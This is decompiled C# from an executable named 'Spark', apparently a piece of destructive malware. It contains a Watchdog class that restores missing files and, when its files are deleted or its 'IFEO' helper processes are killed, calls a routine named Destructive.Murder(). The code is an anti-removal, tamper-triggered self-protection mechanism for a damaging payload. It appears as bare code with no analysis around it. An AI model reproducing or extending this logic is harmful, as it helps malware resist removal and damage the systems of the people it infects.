// Decompiled with JetBrains decompiler
// Type: Spark.Watchdog
// Assembly: Spark, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DFB06E8-4427-4218-A5F6-F5DE139079B1
// Assembly location: C:\Users\adriel\Downloads\Spark\Chris@Spark.exe

using System.Diagnostics;
using System.IO;
using System.Threading;

#nullable disable
namespace Spark;

internal class Watchdog
{
  public static void CheckFiles(string[] sFileName, bool bMurder)
  {
    foreach (string path in sFileName)
    {
      if (!File.Exists(path))
      {
        Files.UnpackFiles();
        if (bMurder)
          Destructive.Murder();
      }
    }
  }

  public static void CheckIFEO()
  {
    while (true)
    {
      int length;
      do
      {
        Thread.Sleep(500);
        length = Process.GetProcessesByName("IFEO").Length;
        if (length <= Variables.IFEOLastCheck - 1)
          Destructive.Murder();
      }
      while (length < 3);
      Destructive.Murder();
    }
  }
}
